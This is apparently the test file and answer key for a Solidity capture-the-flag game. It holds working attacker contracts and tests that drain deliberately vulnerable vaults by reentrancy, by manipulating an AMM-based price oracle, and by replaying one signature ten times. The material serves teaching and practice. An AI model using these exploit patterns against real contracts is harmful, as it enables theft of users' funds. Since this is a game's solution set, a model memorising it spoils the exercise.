// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {CTFFactory} from "../src/CTFFactory.sol";
import {TRACE} from "../src/TRACE.sol";
import {MKT} from "../src/MKT.sol";

import {Level1_Reentrancy} from "../src/Level1_Reentrancy.sol";
import {Level2_OracleManipulation} from "../src/Level2_OracleManipulation.sol";
import {Level3_SignatureReplay} from "../src/Level3_SignatureReplay.sol";

import {SimpleAMM} from "../src/SimpleAMM.sol";
import {VulnerableOracle} from "../src/VulnerableOracle.sol";

import {
    MessageHashUtils
} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";


// ==========================================================
// LEVEL 1 ATTACKER
// ==========================================================

contract Level1Attacker {
    Level1_Reentrancy public vault;
    TRACE public trace;

    constructor(
        Level1_Reentrancy _vault,
        TRACE _trace
    ) {
        vault = _vault;
        trace = _trace;
    }

    function attack(uint256 amount) external {
        trace.approve(address(vault), amount);

        vault.deposit(amount);

        vault.withdraw();
    }

    function onTRCReceived(uint256) external {
        if (trace.balanceOf(address(vault)) > 0) {
            vault.withdraw();
        }
    }
}


// ==========================================================
// LEVEL 2 ATTACKER
// ==========================================================

contract Level2Attacker {
    Level2_OracleManipulation public vault;
    SimpleAMM public amm;
    MKT public mkt;
    TRACE public trace;

    constructor(
        Level2_OracleManipulation _vault,
        SimpleAMM _amm,
        MKT _mkt,
        TRACE _trace
    ) {
        vault = _vault;
        amm = _amm;
        mkt = _mkt;
        trace = _trace;
    }

    function attack() external {
        // --------------------------------------------------
        // 1. Manipulate the AMM price
        //
        // Spend 40 TRC to buy MKT.
        // AMM:
        //
        // Before:
        // 10 MKT / 10 TRC
        //
        // After:
        // 2 MKT / 50 TRC
        //
        // Price becomes:
        // 50 / 2 = 25 TRC per MKT
        // --------------------------------------------------

        trace.approve(
            address(amm),
            40 ether
        );

        amm.swapTRACEForMKT(
            40 ether
        );

        // --------------------------------------------------
        // 2. Deposit 10 MKT as collateral
        // --------------------------------------------------

        mkt.approve(
            address(vault),
            10 ether
        );

        vault.deposit(
            10 ether
        );

        // --------------------------------------------------
        // 3. Borrow the entire 100 TRC vault
        // --------------------------------------------------

        vault.borrow(
            100 ether
        );
    }
}


// ==========================================================
// TEST
// ==========================================================

contract CTFFactoryTest is Test {

    CTFFactory public factory;

    TRACE public trace;

    address public player = address(0x1337);

    uint256 public trustedSignerPrivateKey = 0xABC123;
    address public trustedSigner;


    function setUp() public {

        trustedSigner =
            vm.addr(trustedSignerPrivateKey);

        factory =
            new CTFFactory(
                trustedSigner
            );

        trace =
            factory.trace();

        vm.deal(
            player,
            10 ether
        );
    }


    // ======================================================
    // LEVEL 1
    // ======================================================

    function test_Level1_Reentrancy() public {

        vm.startPrank(player);

        // Player gets 10 TRC.
        factory.claimTokens();

        assertEq(
            trace.balanceOf(player),
            10 ether
        );

        // Deploy Level 1.
        address instanceAddress =
            factory.deployLevel1();

        Level1_Reentrancy vault =
            Level1_Reentrancy(
                instanceAddress
            );

        // Vault contains 100 TRC.
        assertEq(
            trace.balanceOf(address(vault)),
            100 ether
        );

        // Create attacker.
        Level1Attacker attacker =
            new Level1Attacker(
                vault,
                trace
            );

        // Give attacker 1 TRC.
        trace.transfer(
            address(attacker),
            1 ether
        );

        // Execute reentrancy attack.
        attacker.attack(
            1 ether
        );

        // Vault should be empty.
        assertEq(
            trace.balanceOf(address(vault)),
            0
        );

        assertTrue(
            vault.isComplete()
        );

        // Validate Level 1.
        factory.validateLevel1();

        assertTrue(
            factory.isSolved(
                1,
                player
            )
        );

        assertEq(
            factory.badgeContract().balanceOf(
                player,
                1
            ),
            1
        );

        vm.stopPrank();
    }


    // ======================================================
    // LEVEL 2
    // ======================================================

    function test_Level2_OracleManipulation() public {

        vm.startPrank(player);

        // ----------------------------------------------
        // Level 1 must be solved first.
        // ----------------------------------------------

        factory.claimTokens();

        address level1Address =
            factory.deployLevel1();

        Level1_Reentrancy level1 =
            Level1_Reentrancy(
                level1Address
            );

        Level1Attacker attacker =
            new Level1Attacker(
                level1,
                trace
            );

        // Give attacker 1 TRC.
        trace.transfer(
            address(attacker),
            1 ether
        );

        attacker.attack(
            1 ether
        );

        factory.validateLevel1();

        assertTrue(
            factory.isSolved(
                1,
                player
            )
        );


        // ----------------------------------------------
        // Deploy Level 2.
        // ----------------------------------------------

        address level2Address =
            factory.deployLevel2();

        Level2_OracleManipulation vault =
            Level2_OracleManipulation(
                level2Address
            );


        // ----------------------------------------------
        // Get the MKT, AMM and Oracle addresses.
        // ----------------------------------------------

        MKT mkt =
            MKT(
                address(
                    vault.mkt()
                )
            );

        VulnerableOracle oracle =
            vault.oracle();

        SimpleAMM amm =
            oracle.amm();


        // ----------------------------------------------
        // Verify starting balances.
        // ----------------------------------------------

        assertEq(
            mkt.balanceOf(player),
            10 ether
        );


        assertEq(
            trace.balanceOf(address(vault)),
            100 ether
        );


        // ----------------------------------------------
        // Check initial oracle price.
        // ----------------------------------------------

        uint256 initialPrice =
            oracle.getPrice();

        assertEq(
            initialPrice,
            1 ether
        );


        // ----------------------------------------------
        // Create Level 2 attacker.
        // ----------------------------------------------

        Level2Attacker level2Attacker =
            new Level2Attacker(
                vault,
                amm,
                mkt,
                trace
            );

        // Give attacker the player's Level 2 assets.
        trace.transfer(
            address(level2Attacker),
            40 ether
        );

        mkt.transfer(
            address(level2Attacker),
            10 ether
        );


        // ----------------------------------------------
        // Execute oracle manipulation.
        // ----------------------------------------------

        level2Attacker.attack();


        // ----------------------------------------------
        // Oracle should now report an inflated price.
        // ----------------------------------------------

        uint256 manipulatedPrice =
            oracle.getPrice();

        assertEq(
            manipulatedPrice,
            25 ether
        );


        // ----------------------------------------------
        // Vault should now be drained.
        // ----------------------------------------------

        assertEq(
            trace.balanceOf(address(vault)),
            0
        );

        assertTrue(
            vault.isComplete()
        );


        // ----------------------------------------------
        // Validate Level 2.
        // ----------------------------------------------

        factory.validateLevel2();

        assertTrue(
            factory.isSolved(
                2,
                player
            )
        );

        assertEq(
            factory.badgeContract().balanceOf(
                player,
                2
            ),
            1
        );

        vm.stopPrank();
    }


    // ======================================================
    // LEVEL 3
    // ======================================================

    function test_Level3_SignatureReplay() public {

        vm.startPrank(player);

        // ----------------------------------------------
        // Level 1
        // ----------------------------------------------

        factory.claimTokens();

        address level1Address =
            factory.deployLevel1();

        Level1_Reentrancy level1 =
            Level1_Reentrancy(
                level1Address
            );

        Level1Attacker attacker =
            new Level1Attacker(
                level1,
                trace
            );

        trace.transfer(
            address(attacker),
            1 ether
        );

        attacker.attack(
            1 ether
        );

        factory.validateLevel1();


        // ----------------------------------------------
        // Level 2
        // ----------------------------------------------

        address level2Address =
            factory.deployLevel2();

        Level2_OracleManipulation vault2 =
            Level2_OracleManipulation(
                level2Address
            );

        MKT mkt =
            MKT(
                address(
                    vault2.mkt()
                )
            );

        VulnerableOracle oracle =
            vault2.oracle();

        SimpleAMM amm =
            oracle.amm();

        Level2Attacker attacker2 =
            new Level2Attacker(
                vault2,
                amm,
                mkt,
                trace
            );

        trace.transfer(
            address(attacker2),
            40 ether
        );

        mkt.transfer(
            address(attacker2),
            10 ether
        );

        attacker2.attack();

        factory.validateLevel2();


        // ----------------------------------------------
        // Level 3
        // ----------------------------------------------

        address level3Address =
            factory.deployLevel3();

        Level3_SignatureReplay vault =
            Level3_SignatureReplay(
                level3Address
            );


        // ----------------------------------------------
        // Verify vault contains 100 TRC.
        // ----------------------------------------------

        assertEq(
            trace.balanceOf(address(vault)),
            100 ether
        );


        // ----------------------------------------------
        // Create a signature authorizing:
        //
        // player → withdraw 10 TRC
        // ----------------------------------------------

        uint256 withdrawalAmount =
            10 ether;

        bytes32 messageHash =
            keccak256(
                abi.encodePacked(
                    address(vault),
                    player,
                    withdrawalAmount
                )
            );

        bytes32 ethSignedMessageHash =
            MessageHashUtils
                .toEthSignedMessageHash(
                    messageHash
                );

        (
            uint8 v,
            bytes32 r,
            bytes32 s
        ) =
            vm.sign(
                trustedSignerPrivateKey,
                ethSignedMessageHash
            );

        bytes memory signature =
            abi.encodePacked(
                r,
                s,
                v
            );


        // ----------------------------------------------
        // Replay the SAME signature 10 times.
        // ----------------------------------------------

        for (
            uint256 i = 0;
            i < 10;
            i++
        ) {
            vault.withdraw(
                player,
                withdrawalAmount,
                signature
            );
        }


        // ----------------------------------------------
        // Vault should be empty.
        // ----------------------------------------------

        assertEq(
            trace.balanceOf(address(vault)),
            0
        );

        assertTrue(
            vault.isComplete()
        );


        // ----------------------------------------------
        // Validate Level 3.
        // ----------------------------------------------

        factory.validateLevel3();

        assertTrue(
            factory.isSolved(
                3,
                player
            )
        );

        assertEq(
            factory.badgeContract().balanceOf(
                player,
                3
            ),
            1
        );

        vm.stopPrank();
    }
}